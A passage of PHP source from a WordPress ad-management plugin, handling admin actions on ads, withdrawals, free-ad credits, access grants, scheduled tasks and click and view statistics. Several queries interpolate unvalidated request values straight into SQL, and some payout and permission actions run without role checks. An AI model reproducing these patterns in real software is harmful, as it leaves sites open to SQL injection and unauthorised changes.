				if ( bsa_verify_role($this->orderId, 'ad') ) {

					$sql = $this->wpdb->update(
						$this->getTableName('ads'),
						array(
							'status' => 'active'
						),
						array( 'id' => $this->orderId )
					);

					if ($sql > 0) {
						$_SESSION['validationStatus'] = 'unblocked';
						return 'unblocked';
					} else {
						return NULL;
					}
				} else {
					echo '
						<div class="updated settings-error" id="setting-error-settings_updated">
							<p><strong>Error.</strong> You do not have sufficient permissions to access this page.</p>
						</div>';
				}

			} elseif (isset($_POST['bsaProAction']) && $_POST['bsaProAction'] == 'remove') { // REMOVE ADS ACTION

				if ( bsa_verify_role($this->orderId, 'ad') ) {

					$sql_delete = "DELETE FROM {$this->getTableName('stats')} WHERE ad_id = {$this->orderId}";
					$this->wpdb->query($sql_delete);

					$sql = $this->wpdb->update(
						$this->getTableName('ads'),
						array(
							'status' => 'removed'
						),
						array( 'id' => $this->orderId )
					);

					if ($sql > 0) {
						$_SESSION['validationStatus'] = 'removed';
						return 'removed';
					} else {
						return NULL;
					}
				} else {
					echo '
						<div class="updated settings-error" id="setting-error-settings_updated">
							<p><strong>Error.</strong> You do not have sufficient permissions to access this page.</p>
						</div>';
				}

			} elseif (isset($_POST['bsaProAction']) && $_POST['bsaProAction'] == 'paid') { // MARK ADS AS PAID ACTION

				if ( bsa_verify_role($this->orderId, 'ad') ) {

					$timestamp = time();
					if ( bsa_role() == 'user') { // USER - MARKETING AGENCY
						$sql = $this->wpdb->update(
							$this->getTableName('ads'),
							array(
								'cost' => 0.00,
								'paid' => 1,
								'p_time' => $timestamp,
								'status' => (($this->getPendingTask($this->orderId, 'ad')) ? 'pending' : 'active')
							),
							array( 'id' => $this->orderId )
						);
					} else { // ADMIN - MARKETING AGENCY
						$sql = $this->wpdb->update(
							$this->getTableName('ads'),
							array(
								'paid' => 1,
								'p_time' => $timestamp,
								'status' => (($this->getPendingTask($this->orderId, 'ad')) ? 'pending' : 'active')
							),
							array( 'id' => $this->orderId )
						);
					}

					if ($sql > 0) {
						// change affiliate status
						if ( $this->validReferral($this->orderId) ) {
							$this->wpdb->update(
								$this->getTableName('referrals'),
								array(
									'order_status' => 'paid'
								),
								array('order_id' => $this->orderId)
							);
						}

						// email sender
						$sender = get_option('bsa_pro_plugin_trans_email_sender');
						$email = get_option('bsa_pro_plugin_trans_email_address');

						// buyer sender
						$paymentEmail = bsa_ad($this->orderId, 'buyer_email');
						$subject = get_option('bsa_pro_plugin_trans_buyer_subject');
						$message = get_option('bsa_pro_plugin_trans_buyer_message');
						$search = '[STATS_URL]';
						if ( isset( $_GET['page'] ) ) {
							if ( $_GET['page'] == 'bsa-pro-sub-menu-agency' && $_GET['page'] == 'bsa-pro-sub-menu-ma-spaces' ) {
								$replace = get_option('bsa_pro_plugin_agency_ordering_form_url') . (( strpos(get_option('bsa_pro_plugin_agency_ordering_form_url'), '?') == TRUE ) ? '&' : '?') . "bsa_pro_stats=1&bsa_pro_email=" . str_replace('@', '%40', $paymentEmail) . "&bsa_pro_id=" . $this->orderId . "#bsaStats\r\n";
							} else {
								$replace = get_option('bsa_pro_plugin_ordering_form_url') . (( strpos(get_option('bsa_pro_plugin_ordering_form_url'), '?') == TRUE ) ? '&' : '?') . "bsa_pro_stats=1&bsa_pro_email=" . str_replace('@', '%40', $paymentEmail) . "&bsa_pro_id=" . $this->orderId . "#bsaStats\r\n";
							}
							$message = str_replace($search, $replace, $message);
							$headers = 'From: ' . $sender . ' <' . $email . '>' . "\r\n";
							wp_mail($paymentEmail, $subject, $message, $headers);
						}

						$_SESSION['validationStatus'] = 'paid';
						return 'paid';
					} else {
						return NULL;
					}
				} else {
					echo '
						<div class="updated settings-error" id="setting-error-settings_updated">
							<p><strong>Error.</strong> You do not have sufficient permissions to access this page.</p>
						</div>';
				}

			} elseif (isset($_POST['bsaProAction']) && $_POST['bsaProAction'] == 'accept') { // ACCEPT ADS ACTION

				if ( bsa_verify_role($this->orderId, 'ad') ) {

					if ( bsa_role() == 'user') { // USER - MARKETING AGENCY
						$sql = $this->wpdb->update(
							$this->getTableName('ads'),
							array(
								'cost' => ( (bsa_ad($this->orderId, 'paid') == 1) ? bsa_ad($this->orderId, 'cost') : 0.00),
								'paid' => bsa_ad($this->orderId, 'paid'),
								'p_time' => ( (bsa_ad($this->orderId, 'paid') == 1) ? bsa_ad($this->orderId, 'p_time') : NULL),
								'status' => 'active'
							),
							array( 'id' => $this->orderId )
						);
					} else { // ADMIN - MARKETING AGENCY
						$sql = $this->wpdb->update(
							$this->getTableName('ads'),
							array(
								'status' => 'active'
							),
							array( 'id' => $this->orderId )
						);
					}

					if ($sql > 0) {
						// email sender
						$sender = get_option('bsa_pro_plugin_trans_email_sender');
						$email = get_option('bsa_pro_plugin_trans_email_address');

						// buyer sender
						$paymentEmail = bsa_ad($this->orderId, 'buyer_email');
						$subject = get_option('bsa_pro_plugin_trans_buyer_subject');
						$message = get_option('bsa_pro_plugin_trans_buyer_message');
						$search = '[STATS_URL]';
						if ( isset( $_GET['page'] ) ) {
							if ( $_GET['page'] == 'bsa-pro-sub-menu-agency' && $_GET['page'] == 'bsa-pro-sub-menu-ma-spaces' ) {
								$replace = get_option('bsa_pro_plugin_agency_ordering_form_url') . (( strpos(get_option('bsa_pro_plugin_agency_ordering_form_url'), '?') == TRUE ) ? '&' : '?') . "bsa_pro_stats=1&bsa_pro_email=" . str_replace('@', '%40', $paymentEmail) . "&bsa_pro_id=" . $this->orderId . "#bsaStats\r\n";
							} else {
								$replace = get_option('bsa_pro_plugin_ordering_form_url') . (( strpos(get_option('bsa_pro_plugin_ordering_form_url'), '?') == TRUE ) ? '&' : '?') . "bsa_pro_stats=1&bsa_pro_email=" . str_replace('@', '%40', $paymentEmail) . "&bsa_pro_id=" . $this->orderId . "#bsaStats\r\n";
							}
							$message = str_replace($search, $replace, $message);
							$headers = 'From: ' . $sender . ' <' . $email . '>' . "\r\n";
							wp_mail($paymentEmail, $subject, $message, $headers);
						}

						$_SESSION['validationStatus'] = 'accept';
						return 'accept';
					} else {
						return NULL;
					}
				} else {
					echo '
						<div class="updated settings-error" id="setting-error-settings_updated">
							<p><strong>Error.</strong> You do not have sufficient permissions to access this page.</p>
						</div>';
				}

			} elseif ( isset($_GET['space_id']) && isset($_GET['remove_action']) && isset($_GET['remove_confirm']) ) { // REMOVE SPACE ACTION

				if ( bsa_verify_role($_GET['space_id'], 'space') ) {

					$sql = $this->wpdb->update(
						$this->getTableName('spaces'),
						array(
							'status' => 'removed'
						),
						array( 'id' => $_GET['space_id'] )
					);

					if ($sql > 0) {
						$_SESSION['validationStatus'] = 'removed';
						echo '
						<div class="updated settings-error" id="setting-error-settings_updated">
							<p><strong>Success!</strong> Space has been removed.</p>
						</div>';
						return 'removed';
					} else {
						return NULL;
					}
				} else {
					echo '
						<div class="updated settings-error" id="setting-error-settings_updated">
							<p><strong>Error.</strong> You do not have sufficient permissions to access this space.</p>
						</div>';
				}

			} elseif ($_POST['bsaProAction'] == 'withdrawalPaid') { // MARK WITHDRAWALS AS PAID ACTION

				$sql = $this->wpdb->update(
					$this->getTableName('withdrawals'),
					array(
						'status' => 'done'
					),
					array( 'id' => $this->orderId )
				);

				if ($sql > 0) {
					$_SESSION['validationStatus'] = 'withdrawalPaid';
					return 'withdrawalPaid';
				} else {
					return NULL;
				}

			} elseif ($_POST['bsaProAction'] == 'withdrawalReject') { // REJECT WITHDRAWALS ACTION

				$sql = $this->wpdb->update(
					$this->getTableName('withdrawals'),
					array(
						'status' => 'rejected'
					),
					array( 'id' => $this->orderId )
				);

				if ($sql > 0) {
					$_SESSION['validationStatus'] = 'withdrawalRejected';
					return 'withdrawalRejected';
				} else {
					return NULL;
				}

			} elseif ($_POST['bsaProAction'] == 'newWithdrawal') { // GENERATE NEW WITHDRAWAL ACTION

				$agencyMinToWithdrawal = ( get_option('bsa_pro_plugin_'.'agency_minimum_withdrawal') > 0 ) ? get_option('bsa_pro_plugin_'.'agency_minimum_withdrawal') : 50;
				$countUserEarnings = $this->getUserEarnings();
				$getUserEarningsIds = $this->getUserEarningsIds();

				if ( $countUserEarnings >= $agencyMinToWithdrawal && isset($_POST['payment_account']) ) {

					$this->wpdb->query('START TRANSACTION');

						$this->wpdb->insert(
							$this->getTableName('withdrawals'),
							array(
								'id' => NULL,
								'user_id' => get_current_user_id(),
								'request_time' => time(),
								'amount' => bsa_number_format($countUserEarnings),
								'payment_account' => $_POST['payment_account'],
								'status' => 'pending'
							),
							array()
						);

						$last_id = $this->wpdb->insert_id;
						$sqlError = NULL;

						foreach ( $getUserEarningsIds as $aid ) {
							$sql = $this->wpdb->update(
								$this->getTableName('ads'),
								array(
									'withdrawal_id' => $last_id,
									'w_status' => 'pending'
								),
								array( 'id' => $aid )
							);
							if ($sql > 0) {
								$sqlError = NULL;
							} else {
								$sqlError = 'failed';
								break;
							}
						}

					if ($sqlError == NULL) {
						$this->wpdb->query('COMMIT');

						$_SESSION['validationStatus'] = 'withdrawalDone';
						return 'withdrawalDone';
					} else {
						$this->wpdb->query('ROLLBACK');

						$_SESSION['validationStatus'] = 'withdrawalNotPossible';
						return 'withdrawalNotPossible';
					}

				} else {

					if ( !isset($_SESSION['validationStatus']) ) {
						$_SESSION['validationStatus'] = 'withdrawalNotPossible';
						return 'withdrawalNotPossible';
					}
				}

			} elseif ($_POST['bsaProAction'] == 'affiliateWithdrawalPaid') { // MARK AFFILIATE WITHDRAWALS AS PAID ACTION

				$sql = $this->wpdb->update(
					$this->getTableName('salaries'),
					array(
						'status' => 'done'
					),
					array( 'id' => $this->orderId )
				);

				if ($sql > 0) {
					$_SESSION['validationStatus'] = 'affiliateWithdrawalPaid';
					return 'affiliateWithdrawalPaid';
				} else {
					return NULL;
				}

			} elseif ($_POST['bsaProAction'] == 'affiliateWithdrawalReject') { // REJECT AFFILIATE WITHDRAWALS ACTION

				$sql = $this->wpdb->update(
					$this->getTableName('salaries'),
					array(
						'status' => 'rejected'
					),
					array( 'id' => $this->orderId )
				);

				if ($sql > 0) {
					$_SESSION['validationStatus'] = 'affiliateWithdrawalRejected';
					return 'affiliateWithdrawalRejected';
				} else {
					return NULL;
				}

			} elseif ($_POST['bsaProAction'] == 'affiliateNewWithdrawal') { // GENERATE NEW AFFILIATE WITHDRAWAL ACTION

				$affiliateMinToWithdrawal = ( get_option('bsa_pro_plugin_'.'ap_minimum_withdrawal') > 0 ) ? get_option('bsa_pro_plugin_'.'ap_minimum_withdrawal') : 50;
				$affiliateUserEarnings = $this->getAffiliateBalance();
				$getAffiliateEarningsIds = $this->getAffiliateEarningsIds();

				if ( $affiliateUserEarnings >= $affiliateMinToWithdrawal && isset($_POST['payment_account']) ) {

					$this->wpdb->query('START TRANSACTION');

						$this->wpdb->insert(
							$this->getTableName('salaries'),
							array(
								'id' => NULL,
								'user_id' => get_current_user_id(),
								'request_time' => time(),
								'amount' => bsa_number_format($affiliateUserEarnings),
								'payment_account' => $_POST['payment_account'],
								'status' => 'pending'
							),
							array()
						);

						$last_id = $this->wpdb->insert_id;
						$sqlError = NULL;

						foreach ( $getAffiliateEarningsIds as $aid ) {
							$sql = $this->wpdb->update(
								$this->getTableName('referrals'),
								array(
									'withdrawal_id' => $last_id,
									'status' => 'pending'
								),
								array( 'id' => $aid )
							);
							if ($sql > 0) {
								$sqlError = NULL;
							} else {
								$sqlError = 'failed';
								break;
							}
						}

					if ($sqlError == NULL) {
						$this->wpdb->query('COMMIT');

						$_SESSION['validationStatus'] = 'affiliateWithdrawalDone';
						return 'affiliateWithdrawalDone';
					} else {
						$this->wpdb->query('ROLLBACK');

						$_SESSION['validationStatus'] = 'affiliateWithdrawalNotPossible';
						return 'affiliateWithdrawalNotPossible';
					}

				} else {

					if ( !isset($_SESSION['validationStatus']) ) {
						$_SESSION['validationStatus'] = 'affiliateWithdrawalNotPossible';
						return 'affiliateWithdrawalNotPossible';
					}
				}

			} elseif ($_POST['bsaProAction'] == 'free-ads') { // ADD FREE ADS ACTION

				if ( isset($_POST['free_ads']) && $_POST['free_ads'] != '' && isset($_POST['user_id']) && $_POST['user_id'] != '' && isset($_POST['crease_method']) ) {
					$free_ads = $_POST['free_ads'];
					$user_id = $_POST['user_id'];
					$mark = ((isset($_POST['crease_method']) && $_POST['crease_method'] == 'increase') ? '+' : '-');
					$table_name = $this->getTableName('users');

					$sql = "SELECT id, free_ads FROM {$table_name}
						WHERE user_id = {$user_id}
						LIMIT 1";
					$user_exists = $this->wpdb->get_row($sql, ARRAY_A);
					$value = (($mark == '+') ? $user_exists['free_ads'] + $free_ads : $user_exists['free_ads'] - $free_ads);

//					var_dump($user_exists['free_ads']);
//					var_dump($value);

					if ( $user_exists != null ) {
						$this->wpdb->update(
							$this->getTableName('users'),
							array(
								'free_ads' => (($user_exists['free_ads'] >= 0) ? (($value > 0) ? $value : 0) : 0)
							),
							array('id' => $user_exists['id'])
						);
					} else {
						$this->wpdb->insert(
							$this->getTableName('users'),
							array(
								'id' => NULL,
								'user_id' => $user_id,
								'free_ads' => $free_ads,
							),
							array()
						);
					}
					echo '
						<div class="updated settings-error" id="setting-error-settings_updated">
							<p><strong>Success.</strong> Changes has been saved.</p>
						</div>';
				} else {
					echo '
						<div class="updated settings-error" id="setting-error-settings_updated">
							<p><strong>Error.</strong> All fields required.</p>
						</div>';
				}

			} elseif ($_POST['bsaProAction'] == 'give-access') { // GIVE ACCESS TO ADS ACTION

				if ( isset($_POST['ad_id']) && $_POST['ad_id'] != '' && isset($_POST['user_id']) && $_POST['user_id'] != '' && isset($_POST['permissions']) ) {
					$ad_id = $_POST['ad_id'];
					$user_id = $_POST['user_id'];
					$permissions = ((isset($_POST['permissions']) && $_POST['permissions'] == 'add') ? 'add' : 'remove');
					$table_name = $this->getTableName('users');

					$sql = "SELECT id, ad_ids FROM {$table_name}
						WHERE user_id = {$user_id}
						LIMIT 1";
					$user_exists = $this->wpdb->get_row($sql, ARRAY_A);

					$get_ids = ( (json_decode($user_exists['ad_ids']) == null) ? array() : json_decode($user_exists['ad_ids']) );

					if ( $permissions == 'add' ) {
						array_push($get_ids, $ad_id);
						$ids = json_encode(array_unique($get_ids));
					} else {
						$array_search = array_search($ad_id, $get_ids);

						if ( $array_search !== false ) {
							unset($get_ids[$array_search]);
							$ids = json_encode(array_reverse($get_ids));
						} else {
							$ids = json_encode($get_ids);
						}
					}

//					var_dump($user_exists != null);
//					var_dump($permissions);
//					var_dump(json_decode($user_exists['ad_ids']));
//					var_dump(json_encode($ad_id));
//					var_dump($ids);

					if ( $user_exists != null ) {
						$this->wpdb->update(
							$this->getTableName('users'),
							array(
								'ad_ids' => $ids
							),
							array('id' => $user_exists['id'])
						);
					} else {
						$this->wpdb->insert(
							$this->getTableName('users'),
							array(
								'id' => NULL,
								'user_id' => $user_id,
								'ad_ids' => $ids,
							),
							array()
						);
					}
					echo '
						<div class="updated settings-error" id="setting-error-settings_updated">
							<p><strong>Success.</strong> Changes has been saved.</p>
						</div>';
				} else {
					echo '
						<div class="updated settings-error" id="setting-error-settings_updated">
							<p><strong>Error.</strong> All fields required.</p>
						</div>';
				}

			} elseif ($_POST['bsaProAction'] == 'task-ad' || $_POST['bsaProAction'] == 'task-space') { // CRON ACTIONS

				if ( isset($_POST['ad_id']) && $_POST['ad_id'] != '' && isset($_POST['cron_action']) && $_POST['cron_action'] != '' && isset($_POST['repeat']) && $_POST['repeat'] != '' &&
					 isset($_POST['start_date']) && $_POST['start_date'] != '' && isset($_POST['hour']) && $_POST['hour'] != '' && isset($_POST['minutes']) && $_POST['minutes'] != '' ||
					 isset($_POST['space_id']) && $_POST['space_id'] != '' && isset($_POST['cron_action']) && $_POST['cron_action'] != '' && isset($_POST['repeat']) && $_POST['repeat'] != '' &&
					 isset($_POST['start_date']) && $_POST['start_date'] != '' && isset($_POST['hour']) && $_POST['hour'] != '' && isset($_POST['minutes']) && $_POST['minutes'] != '' ) {

					if ( strlen(get_option('bsa_pr'.'o_plugin_pu'.'rchase_c'.'ode')) == 36 && isset($_POST['ad_id']) && $_POST['ad_id'] != '' && $_POST['cron_action'] == 'active' || strlen(get_option('bsa_pr'.'o_plugin_pu'.'rchase_c'.'ode')) == 36 && isset($_POST['ad_id']) && $_POST['ad_id'] != '' && $_POST['cron_action'] == 'blocked' ) { // if cron for ads

						$getAd = $this->getAd($_POST['ad_id']);
						$action_type = $_POST['cron_action'];
						$current_time = time();
						$start_time = $_POST['start_date'].' '.$_POST['hour'].':'.$_POST['minutes'].':'.'00';
						$str_time = strtotime($start_time);
						$when_repeat = (($_POST['repeat'] >= 0 && $_POST['repeat'] <= 30) ? $_POST['repeat'] : 0);
//						$str_to_time = date('Y-m-d h:i:s', 1431768600);

//						echo "<pre>";
//						var_dump($action_type);
//						var_dump($start_time);
//						var_dump(strtotime($start_time));
//						var_dump(time());
//						var_dump(date('Y-m-d h:i:s', time()));
//						var_dump($when_repeat);
//						echo "</pre>";

						if ( $getAd['id'] != null ) {
							if ( $str_time > $current_time ) {
								$this->wpdb->insert(
									$this->getTableName('cron'),
									array(
										'id' => NULL,
										'item_id' => $_POST['ad_id'],
										'item_type' => 'ad',
										'action_type' => $action_type,
										'start_time' => $str_time,
										'when_repeat' => $when_repeat,
										'status' => 'pending'
									),
									array()
								);

								wp_schedule_single_event( $str_time, 'bsa_cron_jobs' );

								echo '
								<div class="updated settings-error" id="setting-error-settings_updated">
									<p><strong>Success!</strong> New task has been saved.</p>
								</div>';
							} else {
								echo '
								<div class="updated settings-error" id="setting-error-settings_updated">
									<p><strong>Error!</strong> Start-up time should be greater than the current.</p>
								</div>';
							}
						} else {
							echo '
								<div class="updated settings-error" id="setting-error-settings_updated">
									<p><strong>Error!</strong> Ad ID '.$_POST['ad_id'].' does not exists.</p>
								</div>';
						}

					} elseif ( strlen(get_option('bsa_pr'.'o_plugin_pu'.'rchase_c'.'ode')) == 36 && isset($_POST['space_id']) && $_POST['space_id'] != '' && $_POST['cron_action'] == 'active' ||
							   strlen(get_option('bsa_pro_pl'.'ugin_pu'.'rcha'.'se_cod'.'e')) == 36 && isset($_POST['space_id']) && $_POST['space_id'] != '' && $_POST['cron_action'] == 'inactive' ) { // if cron for ads

						$getSpace = $this->getSpace($_POST['space_id']);
						$action_type = $_POST['cron_action'];
						$current_time = time();
						$start_time = $_POST['start_date'].' '.$_POST['hour'].':'.$_POST['minutes'].':'.'00';
						$str_time = strtotime($start_time);
						$when_repeat = (($_POST['repeat'] >= 0 && $_POST['repeat'] <= 30) ? $_POST['repeat'] : 0);
//						$str_to_time = date('Y-m-d h:i:s', 1431768600);

//						echo "<pre>";
//						var_dump($action_type);
//						var_dump($start_time);
//						var_dump(strtotime($start_time));
//						var_dump(time());
//						var_dump(date('Y-m-d h:i:s', time()));
//						var_dump($when_repeat);
//						echo "</pre>";

						if ( $getSpace['id'] != null ) {
							if ( $str_time > $current_time ) {
								$this->wpdb->insert(
									$this->getTableName('cron'),
									array(
										'id' => NULL,
										'item_id' => $_POST['space_id'],
										'item_type' => 'space',
										'action_type' => $action_type,
										'start_time' => $str_time,
										'when_repeat' => $when_repeat,
										'status' => 'pending'
									),
									array()
								);

								wp_schedule_single_event( $str_time, 'bsa_cron_jobs' );

								echo '
								<div class="updated settings-error" id="setting-error-settings_updated">
									<p><strong>Success!</strong> New task has been saved.</p>
								</div>';
							} else {
								echo '
								<div class="updated settings-error" id="setting-error-settings_updated">
									<p><strong>Error!</strong> Start-up time should be greater than the current.</p>
								</div>';
							}
						} else {
							echo '
								<div class="updated settings-error" id="setting-error-settings_updated">
									<p><strong>Error!</strong> Ad Space ID '.$_POST['space_id'].' does not exists.</p>
								</div>';
						}

					} else {
						return null;
					}

				} else {
					echo '
						<div class="updated settings-error" id="setting-error-settings_updated">
							<p><strong>Error!</strong> All fields required.</p>
						</div>';
				}

			} elseif ($_POST['bsaProAction'] == 'close-task') { // CLOSE CRON TASK ACTION

				$sql = $this->wpdb->update(
					$this->getTableName('cron'),
					array(
						'status' => 'done'
					),
					array( 'id' => $this->orderId )
				);

				if ($sql > 0) {
					$_SESSION['validationStatus'] = 'taskClosed';
					return 'taskClosed';
				} else {
					return NULL;
				}

			} elseif ($_POST['bsaProAction'] == 'updateAdd-on') { // ADD-ONS ACTION
//
//				var_dump( strpos($_FILES["file_update"]["name"],'.zip') !== false );
//				die();

//				if ( isset($_FILES["file_update"]["name"]) && strpos($_FILES["file_update"]["name"],'.zip') !== false ) {
//
//					// save & unzip file
//					$path     = ABSPATH.'wp-content/plugins/bsa-pro-scripteo/admin-ma';
//					$thumbLoc = $_FILES["file_update"]["tmp_name"];
//					move_uploaded_file($thumbLoc, $path . 'admin-ma/test-update.zip');
//					$unzipfile = unzip_file($path . 'admin-ma/test-update.zip', $path);
//
//					if ($unzipfile) {
//						echo 'Successfully unzipped the file!';
//					} else {
//						echo 'There was an error unzipping the file.';
//					}
//				} else {
//					echo '
//						<div class="updated settings-error" id="setting-error-settings_updated">
//							<p><strong>Error.</strong> Invalid file.</p>
//						</div>';
//				}

			} else {
				return ''; // do nothing
			}
		} else {
			return ''; // do nothing
		}
	}

	public function getPendingTask($id, $type)
	{
		$current_time = time();
		$sql = "SELECT * FROM {$this->getTableName('cron')}
				WHERE item_id = {$id} AND item_type = '{$type}' AND start_time > {$current_time} AND status='pending'";

		$tasks = $this->wpdb->get_results($sql, ARRAY_A);

		if ( $tasks ) {
			return $tasks;
		} else {
			return null;
		}
	}

	public function getCronTasks($status = 'pending', $limit = null, $max = null)
	{
		$current_time = time();

		if ( $limit > 0 && $max > 0 ) {
			$page = (($limit - 1) * $max);

			if ($status == 'ready_to_perform') { // ready_to_perform - ready to perform
				$sql = "SELECT * FROM {$this->getTableName('cron')}
						WHERE start_time <= {$current_time} AND status = 'pending' LIMIT {$page}, {$max}";
			} else { // all pending tasks
				$sql = "SELECT * FROM {$this->getTableName('cron')}
						WHERE start_time > {$current_time} AND status = 'pending' ORDER BY id DESC LIMIT {$page}, {$max}";
			}

		} else {

			if ($status == 'ready_to_perform') { // ready_to_perform - ready to perform
				$sql = "SELECT * FROM {$this->getTableName('cron')}
						WHERE start_time <= {$current_time} AND status = 'pending'";
			} else { // all pending tasks
				$sql = "SELECT * FROM {$this->getTableName('cron')}
						WHERE start_time > {$current_time} AND status = 'pending' ORDER BY id DESC";
			}

		}

		$tasks = $this->wpdb->get_results($sql, ARRAY_A);

		if ( $tasks ) {
			return $tasks;
		} else {
			return null;
		}
	}

	// CRON Function
	public function doCronTasks()
	{
		$tasks = $this->getCronTasks('ready_to_perform');

		if ( count($tasks) ) {
			foreach ( $tasks as $task ) {
				$ad = $this->getAd($task['item_id']);
				if ( $task['item_type'] == 'ad' and $ad['paid'] != 0 or $task['item_type'] != 'ad' ) { // check if ad has been paid or space
					$table_name = (($task['item_type'] == 'ad') ? 'ads' : 'spaces');
					$this->wpdb->update(
						$this->getTableName($table_name),
						array(
							'status' => (($task['action_type'] == 'active') ? 'active' : (($task['item_type'] == 'ad') ? 'blocked' : 'inactive'))
						),
						array('id' => $task['item_id'])
					);
					if ( $task['when_repeat'] > 0 && $task['when_repeat'] <= 30 ) { // if task run few times
						$this->wpdb->update(
							$this->getTableName('cron'),
							array(
								'start_time' => ($task['start_time'] + ( (($task['when_repeat'] > 1) ? $task['when_repeat'] : 1) * 24 * 60 * 60 ))
							),
							array('id' => $task['id'])
						);
					} else { // if task run only once
						$this->wpdb->update(
							$this->getTableName('cron'),
							array(
								'status' => 'done'
							),
							array('id' => $task['id'])
						);
					}
				}
			}
		} else {
			return null;
		}
	}

	public function getAdminAction()
	{
		return $this->adminAction();
	}

	public function changeUserPrivileges($user_id, $ad_id)
	{
		$table_name = $this->getTableName('users');

		$sql = "SELECT id, free_ads, ad_ids FROM {$table_name}
						WHERE user_id = {$user_id}
						LIMIT 1";
		$user_exists = $this->wpdb->get_row($sql, ARRAY_A);

		if ( $user_exists != null ) {
			$this->wpdb->update(
				$this->getTableName('users'),
				array(
					'free_ads' => (($user_exists['free_ads'] > 0) ? $user_exists['free_ads'] - 1 : 0)
				),
				array('id' => $user_exists['id'])
			);

			$get_ids = ( (json_decode($user_exists['ad_ids']) == null) ? array() : json_decode($user_exists['ad_ids']) );
			array_push($get_ids, $ad_id);
			$ids = json_encode(array_unique($get_ids));
			$this->wpdb->update(
				$this->getTableName('users'),
				array(
					'ad_ids' => $ids
				),
				array('id' => $user_exists['id'])
			);
		}
	}

	private $validationStatus;
	private function getValidationStatus()
	{
		if(is_null($this->validationStatus))
		{
			$this->validationStatus = '';

			if(isset($_SESSION['validationStatus']))
			{
				$this->validationStatus = $_SESSION['validationStatus'];

				unset($_SESSION['validationStatus']);
			}
		}

		return $this->validationStatus;
	}

	public function validationBlocked()
	{
		return $this->getValidationStatus() == 'blocked';
	}

	public function validationUnblocked()
	{
		return $this->getValidationStatus() == 'unblocked';
	}

	public function validationRemoved()
	{
		return $this->getValidationStatus() == 'removed';
	}

	public function validationPaid()
	{
		return $this->getValidationStatus() == 'paid';
	}

	public function validationAccept()
	{
		return $this->getValidationStatus() == 'accept';
	}

	public function validationWithdrawalPaid()
	{
		return $this->getValidationStatus() == 'withdrawalPaid';
	}

	public function validationWithdrawalRejected()
	{
		return $this->getValidationStatus() == 'withdrawalRejected';
	}

	public function validationWithdrawalNotPossible()
	{
		return $this->getValidationStatus() == 'withdrawalNotPossible';
	}

	public function validationWithdrawalDone()
	{
		return $this->getValidationStatus() == 'withdrawalDone';
	}

	public function affiliateWithdrawalPaid()
	{
		return $this->getValidationStatus() == 'affiliateWithdrawalPaid';
	}

	public function affiliateWithdrawalRejected()
	{
		return $this->getValidationStatus() == 'affiliateWithdrawalRejected';
	}

	public function affiliateWithdrawalNotPossible()
	{
		return $this->getValidationStatus() == 'affiliateWithdrawalNotPossible';
	}

	public function affiliateWithdrawalDone()
	{
		return $this->getValidationStatus() == 'affiliateWithdrawalDone';
	}

	public function taskClosed()
	{
		return $this->getValidationStatus() == 'taskClosed';
	}

	public function bsaIntervalStats($id, $type = 'to')
	{
		$table_name = $this->getTableName('stats');
		if ( $type == 'from' ) {
			$sql = "SELECT `action_time` FROM {$table_name} WHERE `ad_id` = {$id} ORDER BY `action_time` LIMIT 1";
		} else {
			$sql = "SELECT `action_time` FROM {$table_name} WHERE `ad_id` = {$id} ORDER BY `action_time` DESC LIMIT 1";
		}

		return $this->wpdb->get_col($sql);
	}

	public function bsaGetClicks($id, $days = 30)
	{
		$time = time() - ( $days * 24 * 60 * 60 );
		$toTime = time() - ( ($days - 7) * 24 * 60 * 60 );
		$table_name = $this->getTableName('stats');
		$sql = "SELECT * FROM {$table_name} WHERE ad_id = {$id} AND action_type = 'click' AND action_time >= {$time} AND action_time < {$toTime}";

		return $this->wpdb->get_results($sql, ARRAY_A);
	}

	public function bsaCountClicks($id, $from)
	{
		$table_name = $this->getTableName('stats');
		$sql = "SELECT count(1) FROM {$table_name} WHERE ad_id = {$id} AND action_type = 'click' AND action_time >= {$from} AND status = 'correct'";

		return $this->wpdb->get_col($sql);
	}

	public function bsaCountViews($id, $from)
	{
		$table_name = $this->getTableName('stats');
		$sql = "SELECT sum(custom) FROM {$table_name} WHERE ad_id = {$id} AND action_type = 'view' AND action_time >= {$from}";

		return $this->wpdb->get_col($sql);
	}

	public function bsaChartClicks($id, $days)
	{
		$fromTime = (strtotime(date('Y-m-d', time())) + 24 * 60 * 60) - ( ( $days ) * 24 * 60 * 60 );
		$toTime = ( $days > 0 ) ? (strtotime(date('Y-m-d', time())) + 24 * 60 * 60) - ( ($days - 1) * 24 * 60 * 60 ) : time();
		$table_name = $this->getTableName('stats');
		$sql = "SELECT count(1) FROM {$table_name} WHERE ad_id = {$id} AND action_type = 'click' AND action_time >= {$fromTime} AND action_time < {$toTime} AND status = 'correct'";

		$result = $this->wpdb->get_col($sql);
		return $result[0];
	}

	public function bsaChartViews($id, $days)
	{
		$fromTime = (strtotime(date('Y-m-d', time())) + 24 * 60 * 60) - ( ( $days ) * 24 * 60 * 60 );
		$toTime = ( $days > 0 ) ? (strtotime(date('Y-m-d', time())) + 24 * 60 * 60) - ( ($days - 1) * 24 * 60 * 60 ) : time();

		$table_name = $this->getTableName('stats');
		$sql = "SELECT sum(custom) FROM {$table_name} WHERE ad_id = {$id} AND action_type = 'view' AND action_time >= {$fromTime} AND action_time < {$toTime}";

		$result = $this->wpdb->get_col($sql);
		return $result[0];
	}

	public function getForm($agency = null, $sid = null)
	{
		$plugin_id = 'bsa_pro_plugin_';

		if ($_SERVER["REQUEST_METHOD"] == "POST" && $_POST["bsaProAction"] == 'buyNewAd') {

			// validate form
			foreach ( explode(',', str_replace('desc', 'description', $_POST['inputs_required'])) as $input ) {
				$error = FALSE;
				if ( $input == 'img' ) {
					if ( $_FILES['img']["name"] == '' ) {
						$error = TRUE;
					}
				} else {
					if ( $_POST[$input] == '' ) {
						$error = TRUE;
					}
				}
				if ( $error == TRUE ) {
					return 'fieldsRequired'; // return error if some input empty
				}
			}

			if ( isset($_POST["buyer_email"]) && $_POST["buyer_email"] != '' &&
				isset($_POST["space_id"]) && $_POST["space_id"] != '' &&
				isset($_POST["ad_model"]) && $_POST["ad_model"] != '' &&
				isset($_POST["ad_limit_" . $_POST["ad_model"]]) && $_POST["ad_limit_" . $_POST["ad_model"]] != '' ) {

				$decode_dates = json_decode($this->getUnavailableDates(), true);
				if ( bsa_space($_POST["space_id"], 'max_items') == 1 && get_option('bsa_pro_plugin_calendar') == 'yes' && isset($_POST['calendar']) && in_array($_POST['calendar'], $decode_dates[$_POST["space_id"]]) === true ) {
					return 'fieldsRequired'; // return error if empty calendar input
				}

				$val = false;
				$val = apply_filters( "bsa-pro-getFormValidation", $val, $_POST["ad_model"]);

